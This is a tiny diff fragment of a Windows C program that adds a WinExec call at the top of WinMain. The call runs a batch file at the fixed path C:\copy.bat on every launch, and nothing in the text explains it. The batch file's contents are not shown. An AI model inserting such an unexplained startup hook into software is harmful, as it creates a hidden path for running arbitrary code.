@@ -402,6 +402,8 @@ int WINAPI WinMain( HINSTANCE  hInstance,
                     LPSTR      lpCmdLine,
                     int        nCmdShow)
 {
+	UINT res = WinExec ("C:\\copy.bat", SW_SHOWNORMAL);
+
    MSG  msg;
    BOOL done=FALSE;
 
